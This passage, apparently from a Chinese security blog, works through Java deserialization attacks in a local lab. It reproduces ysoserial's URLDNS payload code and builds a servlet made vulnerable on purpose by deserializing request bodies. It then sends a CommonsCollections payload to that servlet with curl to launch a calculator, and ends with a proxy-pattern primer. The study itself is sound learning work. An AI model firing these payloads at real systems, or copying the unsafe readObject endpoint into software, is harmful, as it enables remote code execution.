<h1 id="简易利用链分析-Java-1-8"><a href="#简易利用链分析-Java-1-8" class="headerlink" title="简易利用链分析(Java 1.8)"></a>简易利用链分析(Java 1.8)</h1><p>Java1.8和1.7虽然代码有些许区别，但是最后也是会到hash()方法，然后接下来的链都是一样的</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap-&gt;readObject</span><br><span class="line">HashMap-&gt;putval</span><br><span class="line">HashMap-&gt;hash</span><br><span class="line">URL-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;getHostAddress</span><br><span class="line">    .....</span><br></pre></td></tr></table></figure>
</blockquote>
<p>此处就不演示了。</p>
<h1 id="Ysoserial中的利用链"><a href="#Ysoserial中的利用链" class="headerlink" title="Ysoserial中的利用链"></a>Ysoserial中的利用链</h1><h2 id="巧妙的SilentURLStreamHandler"><a href="#巧妙的SilentURLStreamHandler" class="headerlink" title="巧妙的SilentURLStreamHandler"></a>巧妙的SilentURLStreamHandler</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();<span class="comment">//avoid any DNS resolution</span></span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">                ht.put(u, url); </span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Ysoserial</strong>并没有像我们之前看到的简易利用链那样去用反射的方法在<code>hashmap.put</code>前修改hashCode的值，相反它用了一个非常聪明的办法：<strong>重写handler</strong>。</p>
<p><code>SilentURLStreamHandler</code>继承了<code>URLStreamHandler</code>（因为后者是abstract，不能被创建instance），里面包含两个method，一个是<code>openConnection</code> 一个是<code>getHostAddress</code></p>
<p>其中<code>getHostAddress ()</code>我们非常熟悉，复习下之前的原生态<strong>getHostAddress</strong>的内容：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116214214813.png" alt="image-20211116214214813"></p>
<p>在正常的利用链中，我们是会从getByName()一层层执行下去的，然而Ysoserial直接复写<code>getHostAddress()</code>,让他返回null,因此生成hashMap的时候利用链是不完整的，也就不会触发<strong>DNS请求</strong>。</p>
<h2 id="生成HashMap与URL"><a href="#生成HashMap与URL" class="headerlink" title="生成HashMap与URL"></a>生成HashMap与URL</h2><p>创建<strong>HashMap</strong>后，我们需要把URL放进hashmap中， 因为我们已经创建了一个handler，所以我们需要把handler赋给新创建的URL。</p>
<p>在URL的<strong>constructor</strong>中，我们可以看到，<code>URLStreamHandler</code>是可以自定义的</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116214812588.png" alt="image-20211116214812588"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">ht.put(u, url); <span class="comment">//value可以为任何值，这里Ysoserial把value设置为了我们的URLDNS接收的网址(url)</span></span><br></pre></td></tr></table></figure>

<p>在<strong>hashmap</strong>的<strong>put</strong>完成后，过程中<strong>hashCode</strong>肯定还会变化（即使在检测<strong>hashCode!=-1</strong>的步骤那里我们满足了条件），我们仍需要将他改回**-1**，以便server在执行反序列化的时候，我们的payload可以生效。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h2 id="序列化时的问题"><a href="#序列化时的问题" class="headerlink" title="序列化时的问题"></a>序列化时的问题</h2><p>我们刚刚提到，Ysoserial重写了**getHostAddress()**方法，那我们序列化后的object岂不是也是用这个复写后的方法，服务器进行反序列化时就不会触发URLDNS了？</p>
<p>Ysoserial也解释了这一点：</p>
<blockquote>
<p>Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.</p>
</blockquote>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116220202861.png" alt="image-20211116220202861"></p>
<p>因为<strong>transient</strong>的存在，<strong>Ysoserial</strong>覆写的<strong>handler</strong>不会被序列化，因此我们的<strong>payload</strong>依然是可以被<strong>有效反序列化并触发</strong>的！</p>
<h2 id="利用实现"><a href="#利用实现" class="headerlink" title="利用实现"></a>利用实现</h2><p>这里我依然使用<a href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Java反序列化漏洞之使用Ysoserial(6)</a>中所搭建的web环境(java1.7)。</p>
<p>在Ysoserial中配置：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221349850.png" alt="image-20211116221349850"></p>
<p><strong>注意：在之前的分析中提到过，我们需要加上协议(http://)</strong></p>
<p><strong>Serializer.java：</strong></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221003206.png" alt="image-20211116221003206"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @payload.ser</span><br></pre></td></tr></table></figure>

<p>刷新URLDNS平台后成功收到记录：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221323622.png" alt="image-20211116221323622"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>URLDNS</strong>利用链从<strong>HashMap</strong>入手，到URL类自身的一系列<strong>methods</strong>连成利用链，包括<strong>Ysoserial</strong>对<strong>Handler</strong>的覆写和<strong>transient</strong>的理解，都十分巧妙。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://wjlshare.com/archives/1493">Java反序列化-URLDNS</a></p>
<p><a href="https://www.guildhab.top/2020/08/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E6-%E8%A7%A3%E5%AF%86-ysoserial-urldns-pop-chain/">Java 反序列化漏洞(6) – 解密 YSoSerial : URLDNS POP Chain</a></p>
<p><a href="https://saucer-man.com/information_security/647.html#cl-3">java urldns利用链分析</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserilization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之使用Ysoserial(6)</title>
    <url>/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p><strong>ysoserial是</strong>一款在Github开源的知名java 反序列化利用工具，里面集合了各种java反序列化payload； 由于其中部分payload使用到的低版本JDK中的类，所以建议自己私下分析学习时使用低版本JDK，JDK版本建议在1.7u21以下</p>
</blockquote>
<span id="more"></span>

<h1 id="YsoSerial环境搭建"><a href="#YsoSerial环境搭建" class="headerlink" title="YsoSerial环境搭建"></a>YsoSerial环境搭建</h1><p>首先下载<strong>ysoserial</strong>：<code>git clone https://github.com/frohoff/ysoserial.git</code></p>
<p>用IDEA加载后，打开<code>pom.xml</code>文件，打开后Maven会自动下载对应的依赖，但有些依赖无法下载成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn install:install-file -DgroupId=依赖的groupId -DartifactId=依赖的artifactId -Dversion=依赖的版本 -Dpackaging=jar -Dfile=你下载的jar包的路径</span><br></pre></td></tr></table></figure>

<p>IDEA里JDK配置成1.7</p>
<p>运行<code>GeneratePayload.java</code>，出现以下信息表示YsoSerial环境搭建成功</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906180526562.png" alt="image-20210906180526562"></p>
<h1 id="使用YSoSerial生成序列化字符"><a href="#使用YSoSerial生成序列化字符" class="headerlink" title="使用YSoSerial生成序列化字符"></a>使用YSoSerial生成序列化字符</h1><p>在之前的图中，我们可以看到它的使用方法</p>
<p><code>Usage: java -jar ysoserial-[version]-all.jar [payload] &#39;[command]&#39;</code></p>
<p>此处我们使用IDEA运行程序，所以可以省略前面的 <code>java -jar ysoserial-[version]-all.jar</code></p>
<p>在配置中写入arguments - Windows环境下运行计算器<code>calc</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210907140711586.png" alt="image-20210907140711586"></p>
<p>即可生成以下序列化字符串(payload)</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906181130800.png" alt="image-20210906181130800"></p>
<p>但该payload无法直接复制,所以我们想办法用writeObject()将他写成二进制文件（在<a href="https://leihehehe.github.io/2021/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90-3/">Java反序列化漏洞之Java反序列化流程与分析(3)</a>中学习过）。</p>
<p>在<code>GeneratePayload</code>中有以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="keyword">final</span> <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> payloadClass.newInstance();</span><br><span class="line">	<span class="keyword">final</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line">	<span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> System.out;<span class="comment">//system out</span></span><br><span class="line">	Serializer.serialize(object, out);<span class="comment">//将序列化payload打出来</span></span><br><span class="line">	ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">	System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">	System.exit(INTERNAL_ERROR_CODE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进<code>serialize()</code>方法，发现是在<code>Serializer</code>Class中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">	<span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">	objOut.writeObject(obj);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//for saving in the file.</span></span><br><span class="line">       <span class="comment">//将payload写到文件</span></span><br><span class="line"></span><br><span class="line">       <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>);</span><br><span class="line">       ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">       objectOutputStream.writeObject(obj);</span><br><span class="line">       fileOutputStream.flush();</span><br><span class="line">       fileOutputStream.close();</span><br><span class="line">       objectOutputStream.flush();</span><br><span class="line">       objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>payload保存到文件成功。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906224304869.png" alt="image-20210906224304869"></p>
<h1 id="WebServer环境搭建"><a href="#WebServer环境搭建" class="headerlink" title="WebServer环境搭建"></a>WebServer环境搭建</h1><p><strong>配置环境：java1.7，commoncollections3.1.jar</strong></p>
<p>首先Java中新建Maven项目</p>
<p>在Project Structure中导入Web框架</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906231359407.png" alt="image-20210906231359407"></p>
<p>在main文件夹下创建一个Servlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">ServletInputStream</span> <span class="variable">servletInputStream</span> <span class="operator">=</span> req.getInputStream();<span class="comment">//相当于之前的FileInputStream,不过数据现在是来源于ServletInputStream而不是从文件读取了</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(servletInputStream);<span class="comment">//从ServletInputStream中读取ObjectStream</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectInputStream.readObject();<span class="comment">//读入object</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果出现servlet找不到的情况，按提示下载即可</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906232006712.png" alt="image-20210906232006712"></p>
<p>设置<strong>Router</strong>：访问<code>/test</code>的时候交给<code>MainServlet</code>处理</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MainServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>MainServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MainServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了复现<code>commoncollections1</code>, jdk版本需要为<code>1.7</code>，且需导入<code>commons-collections-3.1.jar</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210906233044231.png" alt="image-20210906233044231"></p>
<p>同时在<code>artifact</code>处需要导入commons collections，否则漏洞复现时会提示找不到库。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210907135825600.png" alt="image-20210907135825600"></p>
<p>若出现<code>Error:java: invalid source release: 8</code>这样的错误，可检查下面几处设置中sdk是否为统一的版本（此处应为1.7）</p>
<blockquote>
<ul>
<li>File -&gt; Project Structure -&gt; Project Settings</li>
<li>File -&gt; Project Structure -&gt; Module Settings -&gt; Tab: Sources: Language Level</li>
<li>File -&gt; Project Structure -&gt; Module Settings -&gt; Tab: Dependencies: Module SDK</li>
<li>File -&gt; Settings -&gt; Compiler -&gt; Java Compiler -&gt; Target bytecode version</li>
</ul>
</blockquote>
<p>运行如下图</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210907113720745.png" alt="image-20210907113720745"></p>
<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>现在，已知我们搭建的网站是有反序列化漏洞的，我们用<code>curl</code>发送我们之前生成的序列化二进制文件</p>
<p><code>curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @payload.ser</code></p>
<blockquote>
<p><strong>注意 : 通过 Curl 发送二进制文件时 , 需要在文件路径前加上 <code>@</code> 符号 , 此时文件中所有的回车符和换行符都将被自动转换 .</strong></p>
</blockquote>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/image-20210907135903851.png" alt="image-20210907135903851"></p>
<p>计算器被成功执行！</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://stackoverflow.com/questions/25878045/errorjava-invalid-source-release-8-in-intellij-what-does-it-mean">Error:java: invalid source release: 8 in Intellij. What does it mean?</a></p>
<p><a href="https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/">Java 反序列化漏洞(5) – 解密 YSoSerial : Java动态代理机制</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之静态代理与动态代理(5)</title>
    <url>/2021/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看了很多前辈的文章，都提到了Java的一大核心机制: 动态代理机制(<strong>Dynamic Proxy</strong>), 这一知识点我断断续续看了有好几天，不复杂但有点绕，所以一直没有写出这篇博文，好在查询了众多资料，现在有了一些自己的理解。</p>
<p>这一章将探究<strong>JAVA静态和动态代理机制</strong> - 有助于我们理解YSoSerial的playload实现机制。</p>
<span id="more"></span>

<h1 id="Java代理机制"><a href="#Java代理机制" class="headerlink" title="Java代理机制"></a>Java代理机制</h1><h2 id="什么是代理机制"><a href="#什么是代理机制" class="headerlink" title="什么是代理机制"></a>什么是代理机制</h2><p>Proxy Design实际上是一种软件设计模式，</p>
<blockquote>
<p>A proxy receives client requests, does some work (access control, caching, etc.) and then passes the request to a service object.</p>
</blockquote>
<p>因为安全问题，client不允许直接access服务端上的某个服务，需要一个Proxy class先处理client的请求，通过Proxy class来访问这个服务，再返回给Client。</p>
<p>而Proxy Class就是代理， 委托Proxy Class帮他和客户建立连接的服务就是Delegate Class - 委托类（被代理）。</p>
<p>通常Proxy和Delegate委托类有<strong>相同的方法</strong>，且Proxy<strong>拥有委托类的reference</strong>，可以调用其方法。在调用其方法的时候，Proxy可以在其基础上添加或者修改功能，这样就不需要修改到委托类，修改代理类本身就可以了。</p>
<p>一个形象的例子：A是房东，他需要出租自己的房子，他会委托代理B（中介）把房子挂在网上，当客户C需要租房时，C会直接和代理B进行交流而不是直接和房东A交流。</p>
<p>所以我们可以得出使用代理模式的好处：</p>
<ul>
<li>Proxies 让我们可以在不改变委托类的情况下，自定义修改委托类方法代码执行前和执行后的behaviour</li>
<li>Proxy pattern是安全的。一个远程的代理可以提供一个proxy stub给客户端， 然后在Server端call the implementation（此处是不是很像我们在<a href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Java反序列化漏洞之JAVA RMI原理、流程(2)</a>中所提到的<strong>JAVA RMI</strong>呢？）</li>
</ul>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理就是手动编写代理类。</p>
<p><strong>委托类和代理类要实现相同的接口</strong></p>
<p><img src="https://pic2.zhimg.com/v2-001c5db900d8785d47c1a5a0c6f32762_r.jpg?source=1940ef5c" alt="preview"></p>
<p>来看看<strong>静态代理</strong>是如何实现的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TestDelegate</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestImp</span> <span class="keyword">implements</span> <span class="title class_">TestDelegate</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代理类handle一个委托类的object：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProxy</span> <span class="keyword">implements</span> <span class="title class_">TestDelegate</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">TestDelegate</span> <span class="variable">testDelegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestImp</span>();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is a hello world message&quot;</span>);<span class="comment">//自定义在前面输出信息</span></span><br><span class="line">        testDelegate.sayHello();<span class="comment">//call委托类的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Client尝试访问sayHello():</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TestProxy</span> <span class="variable">testProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestProxy</span>();</span><br><span class="line">        testProxy.sayHello();<span class="comment">//client没有直接访问TestImp的权限，只能通过TestProxy访问</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/image-20210809150635426.png" alt="image-20210809150635426"></p>
<p><strong>静态代理的缺陷：</strong></p>
<p>程序员要手动为每一个委托类编写一个对应的代理类，如果当前系统有上百千个类，工作量就太大了。而动态代理可以帮助我们解决这个问题。</p>
